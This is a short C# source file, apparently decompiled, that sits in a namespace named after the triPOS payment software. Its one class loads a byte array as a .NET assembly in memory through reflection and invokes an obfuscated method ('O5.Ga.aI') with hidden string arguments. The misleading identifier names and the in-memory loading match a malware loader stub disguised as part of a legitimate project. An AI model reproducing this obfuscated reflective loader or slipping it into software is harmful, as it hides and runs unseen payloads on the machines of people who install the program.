using System;
using System.Reflection;

namespace triPOS_vbnet;

public class ax
{
	public ax(byte[] FeedbackSize)
	{
		MinorVersion((Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { FeedbackSize }));
	}

	public object MinorVersion(Assembly ApplicationIdentity)
	{
		Type type = ApplicationIdentity.GetType("O5.Ga");
		type.InvokeMember("aI", BindingFlags.InvokeMethod, null, null, new string[3]
		{
			ChannelSinkStack.DT,
			ChannelSinkStack.DF,
			"triPOS_vbnet"
		});
		return 1003;
	}
}
